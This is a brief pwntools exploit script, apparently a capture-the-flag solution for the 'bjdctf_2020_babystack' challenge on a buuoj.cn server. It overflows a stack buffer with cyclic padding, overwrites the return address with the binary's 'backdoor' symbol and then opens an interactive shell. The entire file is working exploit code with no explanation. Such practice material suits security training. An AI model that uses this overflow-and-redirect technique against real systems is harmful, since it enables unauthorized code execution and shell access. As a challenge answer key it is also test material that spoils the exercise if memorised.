from pwn import *
io=remote('node3.buuoj.cn',25703)
elf = ELF('./bjdctf_2020_babystack')
backdoor=elf.symbols['backdoor']
payload=cyclic(0x10+8)+p64(backdoor)

io.recvuntil('name:')
io.sendline(str(1000))
io.recvuntil('name?')
io.sendline(payload)
io.interactive()

